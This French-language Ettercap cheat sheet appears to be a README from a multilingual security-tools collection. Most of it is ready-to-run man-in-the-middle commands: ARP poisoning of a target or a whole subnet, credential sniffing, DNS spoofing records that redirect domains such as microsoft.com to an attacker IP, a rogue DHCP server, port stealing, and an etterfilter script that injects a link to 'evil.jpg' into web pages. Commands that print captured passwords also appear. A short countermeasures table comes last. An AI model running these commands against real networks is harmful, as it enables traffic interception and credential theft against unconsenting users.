<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire Ettercap

[Ettercap](https://www.ettercap-project.org/) est une suite complète pour les attaques de l'homme du milieu (MITM) sur les réseaux locaux (LAN). Il propose le reniflage des connexions en direct, le filtrage de contenu à la volée, la dissection active et passive de nombreux protocoles et la prise en charge de l'empoisonnement ARP, des redirections ICMP, de l'usurpation DHCP et du vol de port.

---

## Table des matières

- [Architecture de base et modes](#core-architecture--modes)
- [Installation et configuration rapide](#installation--quick-setup)
- [ARP Empoisonnement & Sniffing](#arp-poisoning--sniffing)
- [Attaques d'usurpation DNS](#dns-spoofing-attacks)
- [Filtrage de paquets personnalisé (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [usurpation d'identité DHCP et vol de ports](#dhcp-spoofing--port-stealing)
- [Journalisation et extraction de paquets](#logging--packet-extraction)
-[Détection défensive et contre-mesures](#defensive-detection--contre-mesures)

---

## Architecture et modes de base

Ettercap prend en charge plusieurs modes d'exécution :
- **`-T` (mode texte) :** Sortie de terminal légère et sans malédiction, idéale pour les scripts et l'automatisation sans tête.
- **`-C` (mode Curses) :** Interface utilisateur de terminal basée sur Ncurses pour les opérations interactives sans X11.
- **`-G` (mode GTK) :** Interface graphique complète.
- **`-D` (mode démon) :** S'exécute silencieusement en arrière-plan.

Syntaxe de spécification cible :
```text
/MAC/IPs/IPv6/PORTs
```
- Les cibles peuvent être séparées par des virgules ou des plages IP : `//` correspond à tout.
- Exemple : `/192.168.1.50/` cible l'IP `192.168.1.50` sur tous les ports.
- Exemple : `//80,443/` cible tous les hôtes sur les ports 80 et 443.

---

## Installation et configuration rapide
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Vérifiez les emplacements des fichiers de configuration :
- `/etc/ettercap/etter.conf` : configuration du réseau central et de la suppression des privilèges.
- `/etc/ettercap/etter.dns` : table de recherche d'enregistrements d'usurpation DNS.

---

## Empoisonnement et reniflement ARP

### 1. Empoisonnement ARP à distance bidirectionnel
Empoisonner les tables ARP entre un poste de travail cible et la passerelle réseau :
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T` : Mode texte.
- `-q` : mode silencieux (réduit la verbosité, affiche uniquement les informations d'identification capturées).
- `-i eth0` : Interface réseau d'écoute et d'injection.
- `-M arp:remote` : Effectuer un empoisonnement ARP bidirectionnel par l'homme du milieu.

### 2. Reniflage de sous-réseaux entiers (unidirectionnel/diffusion)
Empoisonnez tous les hôtes du sous-réseau contre la passerelle par défaut :
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Uniquement le reniflage passif
Capturez les informations d'identification en texte clair transitant par l'hôte actuel sans usurpation d'identité ARP :
```bash
sudo ettercap -T -q -i eth0
```
---

## Attaques d'usurpation DNS

Ettercap comprend des plugins intégrés, notamment `dns_spoof`.

### Étape 1 : Configurer `/etc/ettercap/etter.dns`
Ajoutez un caractère générique ou une redirection de domaine spécifique :
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Étape 2 : Lancez Ettercap avec le plugin DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof` : Active le plugin d'usurpation DNS.
- Les requêtes DNS interceptées correspondant à `etter.dns` renvoient l'adresse IP de l'attaquant.

---

## Filtrage de paquets personnalisé (`etterfilter`)

Ettercap permet l'inspection des paquets en temps réel et la modification de la charge utile à l'aide de scripts de filtre personnalisés.

### 1. Écrire un script de filtre (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Compiler le filtre avec `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Exécuter avec filtre
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## Usurpation DHCP et vol de ports

### 1. Attaque de serveur DHCP malveillant
Répondez plus rapidement que le serveur DHCP légitime pour attribuer une passerelle malveillante et des adresses DNS :
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Syntaxe : `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Attaque de vol de port (inondation de commutateurs / abus de table CAM)
Voler du trafic sur les réseaux commutés où l'empoisonnement ARP est bloqué ou alerté :
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Journalisation et extraction de paquets

### Enregistrer les sessions capturées brutes
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap` : écriture des données brutes du paquet pcap.
- `-L ettercap_log` : écrivez des journaux de texte disséqués et lisibles par l'homme.

### Convertir les journaux binaires avec `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Détection défensive et contre-mesures

| Vecteur | Mécanisme de détection et de défense |
|---|---|
| **Usurpation ARP** | Activer l'inspection dynamique ARP (DAI) sur les commutateurs gérés ; inspectez `arp -a` pour les MAC en double ; exécutez `arpwatch` ou `arpon`. |
| **Usurpation DNS** | Appliquez DNSSEC, DoH (DNS-over-HTTPS) ou DoT (DNS-over-TLS). |
| **Usurpation DHCP** | Activez la surveillance DHCP sur les commutateurs pour désigner les ports de liaison montante approuvés. |
| **Vol de ports** | Implémentez le contrôle d'accès au réseau (NAC) 802.1X et la sécurité des ports avec des limites MAC par port de commutateur. |